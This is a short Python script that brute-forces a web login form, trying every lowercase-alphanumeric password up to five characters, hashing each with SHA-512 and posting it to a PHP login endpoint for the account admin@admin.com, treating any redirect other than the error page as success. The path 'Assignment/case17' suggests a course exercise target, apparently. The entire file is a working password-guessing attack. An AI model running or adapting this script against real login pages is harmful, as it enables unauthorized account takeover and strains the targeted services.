import hashlib
import string
from itertools import product
import requests

alphabet = string.ascii_lowercase + string.digits


def hash_password(password):
    return hashlib.sha512(password.encode('utf-8')).hexdigest()


def try_login(password):
    return requests.post(
        "http://iu.ru/Assignment/case17/includes/process_login.php",
        data={
            "email": "admin@admin.com",
            "p": hash_password(password)
        },
        allow_redirects=False
    )


def is_password_ok(password):
    response = try_login(password)
    if response.headers["location"] != "../login.php?error=1":
        return True
    return False


def bruteforce():
    for length in range(1, 6):
        for guess in product(alphabet, repeat=length):
            password = "".join(guess)
            if is_password_ok(password):
                return password
    return None


def main():
    password = bruteforce()
    print(password)


if __name__ == "__main__":
    main()
